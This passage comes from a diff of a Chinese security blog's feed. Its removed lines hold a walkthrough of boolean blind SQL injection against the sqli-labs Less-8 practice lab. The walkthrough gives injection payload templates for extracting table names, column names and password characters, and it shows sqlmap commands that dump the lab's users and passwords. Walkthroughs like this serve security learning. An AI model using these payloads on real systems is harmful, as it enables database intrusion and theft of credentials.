-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit XX1,XX2),XX3,XX4)))=XX5 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 是表名称(字符串)不同的位置 
-XX4: 截取的字符长度 1
-XX5: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;5猜字段的长度&quot;&gt;5.猜字段的长度&lt;/h3&gt;
-
-&lt;p&gt;这跟前面猜表长度那里基本一样了&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2)=XX3 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有字段的长度
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 猜测的字段的长度
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;6猜字段名&quot;&gt;6.猜字段名&lt;/h3&gt;
-
-&lt;p&gt;这里跟前面猜表名那里基本一样&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2),XX3,XX4)))=XX5 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量  2
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 是字段名(字符串)不同的位置 
-XX4: 截取的字符长度 1
-XX5: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;7-猜目标数据的长度&quot;&gt;7. 猜目标数据的长度&lt;/h3&gt;
-
-&lt;p&gt;通过之前我们知道了：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;数据库 : security
-表：users
-目标字段: password (这里就暂且取一个目标字段作为例子)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;还是跟之前的一样&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (select length(password) from users limit 0,1)=X --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;8-猜目标数据&quot;&gt;8. 猜目标数据&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select password from users limit 0,1),XX1,1)))=XX2 --+
-
-XX1: 目标数据(字符串)每个字符的位置
-XX2: 目标数据字符串中字符的 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;至此一次布尔盲注就完成了。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-使用工具&quot;&gt;0x03 使用工具&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-burpsuite&quot;&gt;1. burpsuite&lt;/h3&gt;
-
-&lt;p&gt;使用 burpsuite 来玩的话，跟暴破密码的路数基本一样，就不多说了。&lt;/p&gt;
-
-&lt;h3 id=&quot;2-sqlmap&quot;&gt;2. sqlmap&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;step1: 暴出数据库名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u http://192.168.1.102/sqli/Less-8/?id=1 --dbs
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;available databases [6]:
-[*] challenges
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] security
-[*] test
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;step2:暴出security数据库中的表名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u http://192.168.1.102/sqli/Less-8/?id=1 --tables -D security
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: security
-[4 tables]
-+----------+
-| emails   |
-| referers |
-| uagents  |
-| users    |
-+----------+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;step3:暴出users表内容&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u http://192.168.1.102/sqli/Less-8/?id=1 --dump -D security -T users
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: security
-Table: users
-[13 entries]
-+----+----------+------------+
-| id | username | password   |
-+----+----------+------------+
-| 1  | Dumb     | Dumb       |
-| 2  | Angelina | I-kill-you |
-| 3  | Dummy    | p@ssword   |
-| 4  | secure   | crappy     |
-| 5  | stupid   | stupidity  |
-| 6  | superman | genious    |
-| 7  | batman   | mob!le     |
-| 8  | admin    | admin      |
-| 9  | admin1   | admin1     |
-| 10 | admin2   | admin2     |
-| 11 | admin3   | admin3     |
-| 12 | dhakkan  | dumbo      |
-| 14 | admin4   | admin4     |
-+----+----------+------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><category term="sql注入" /><summary type="html">记录布尔盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-8(布尔型单引号GET盲注)。</summary></entry></feed>
+&lt;p&gt;跟布尔盲注时一样，就不再赘述了。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="sql注入" /><summary type="html">记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。</summary></entry></feed>
